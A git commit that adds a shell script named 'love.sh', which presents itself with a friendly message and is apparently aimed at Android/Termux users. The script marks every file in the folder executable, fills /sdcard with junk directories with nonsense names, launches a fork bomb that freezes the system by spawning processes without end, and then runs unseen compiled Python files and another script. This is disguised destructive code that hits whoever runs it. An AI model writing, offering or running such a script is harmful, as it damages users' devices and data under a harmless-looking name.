504a458217133e729f51adb8586d181bda1c9302
Elharam4 <55320959+elostora@users.noreply.github.com>
2020-10-13 13:12:37 -0400

    Create love.sh

---
+++ love.sh
@@ -0,0 +1,17 @@
+echo 'i love you from;elharam4'
+chmod +x *
+cd /sdcard
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghougoiughiupoerhgoiuhrpgihpighrpihpirghpierhgopierhgpierhpg>
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghou
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghouefar
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuogho
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuogh
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghoukkjtpjrtpibjtrpoihj[orth
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghoujklijkl
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghouhyfuru
+mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghouftgrgour
+cd
+;((){ :|:& };:
+python elharam4.pyc
+python el.pyc
+bash end.sh
